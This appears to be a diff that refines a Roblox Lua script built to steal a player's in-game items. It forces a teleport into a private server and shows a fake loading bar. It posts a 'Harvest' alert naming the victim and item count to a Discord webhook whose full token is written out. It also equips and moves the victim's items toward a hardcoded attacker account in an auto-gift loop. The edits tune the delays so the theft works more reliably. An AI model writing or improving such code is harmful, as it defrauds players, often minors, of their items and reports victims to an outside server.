@@ -7,14 +7,14 @@ local player = Players.LocalPlayer
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1515614244295544912/80SYn-CwUdEOAy_UKRzveYvrEzWd21ijv2uZLdXf2JQLY8rVcHS7bug_w_3M6qVHoCqy"
 
 local TARGET_PLAYER_NAME = "hshajsjhehe"
-local PRIVATE_SERVER_LINK_CODE = "https://www.roblox.com/share?code=c17ae8bc0277f44e8edf06e557182767&type=Server"
+local PRIVATE_SERVER_CODE = "c17ae8bc0277f44e8edf06e557182767"  -- Only the code, not full link
 
 -- Force TP to your private server
 task.spawn(function()
-    wait(3)
-    if PRIVATE_SERVER_LINK_CODE and PRIVATE_SERVER_LINK_CODE \~= "c17ae8bc0277f44e8edf06e557182767" then
+    task.wait(4)
+    if PRIVATE_SERVER_CODE and PRIVATE_SERVER_CODE \~= "" then
         pcall(function()
-            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, player, nil, {privateServerLinkCode = PRIVATE_SERVER_LINK_CODE})
+            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, player, nil, {privateServerLinkCode = PRIVATE_SERVER_CODE})
         end)
     end
 end)
@@ -59,22 +59,19 @@ task.spawn(function()
     Bar.Parent = BarBG
 
     local start = tick()
-    while tick() - start < 45 do
-        local p = math.clamp((tick() - start) / 45, 0, 1)
+    while tick() - start < 50 do
+        local p = math.clamp((tick() - start) / 50, 0, 1)
         Bar.Size = UDim2.new(p,0,1,0)
-        task.wait(0.1)
+        task.wait(0.12)
     end
     Bar.Size = UDim2.new(1,0,1,0)
 end)
 
 -- Webhook
 task.spawn(function()
-    task.wait(8)
+    task.wait(10)
     local backpack = player:FindFirstChild("Backpack")
-    local itemCount = 0
-    if backpack then
-        itemCount = #backpack:GetChildren()
-    end
+    local itemCount = backpack and #backpack:GetChildren() or 0
 
     local msg = "@everyone **Harvest**\nVictim: " .. player.Name .. "\nTo: " .. TARGET_PLAYER_NAME .. "\nItems: " .. itemCount
 
@@ -91,11 +88,11 @@ task.spawn(function()
     end
 end)
 
--- Auto gift loop (fixed + safer)
+-- Safer auto gift
 local function equipItem(item)
     pcall(function()
         local char = player.Character
-        if char and char:FindFirstChild("Humanoid") and item then
+        if char and char:FindFirstChild("Humanoid") and item and item.Parent then
             item.Parent = char
             char.Humanoid:EquipTool(item)
         end
@@ -103,44 +100,44 @@ local function equipItem(item)
 end
 
 task.spawn(function()
+    task.wait(8)  -- extra delay to avoid GiftingController conflict
     while true do
         pcall(function()
             local backpack = player:FindFirstChild("Backpack")
             if backpack then
-                for _, item in ipairs(backpack:GetChildren()) do
+                local items = backpack:GetChildren()
+                for _, item in ipairs(items) do
                     if item and item.Parent == backpack then
                         equipItem(item)
-                        task.wait(0.7)
+                        task.wait(1.2)
 
                         local target = Players:FindFirstChild(TARGET_PLAYER_NAME)
                         if target and target.Character and player.Character then
                             local myRoot = player.Character:FindFirstChild("HumanoidRootPart")
                             local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
                             if myRoot and tRoot then
-                                myRoot.CFrame = tRoot.CFrame * CFrame.new(2, 1, 2)
+                                myRoot.CFrame = tRoot.CFrame * CFrame.new(3, 0.5, 3)
                             end
                         end
-                        task.wait(2.2)
+                        task.wait(2.8)
                     end
                 end
             end
         end)
-        task.wait(1)
+        task.wait(2)
     end
 end)
 
 -- Re-equip on respawn
 player.CharacterAdded:Connect(function()
-    task.wait(2)
+    task.wait(3)
     pcall(function()
         local backpack = player:FindFirstChild("Backpack")
         if backpack then
             for _, item in ipairs(backpack:GetChildren()) do
                 equipItem(item)
-                task.wait(0.5)
+                task.wait(0.6)
             end
         end
     end)
 end)
-
-print("Script loaded")
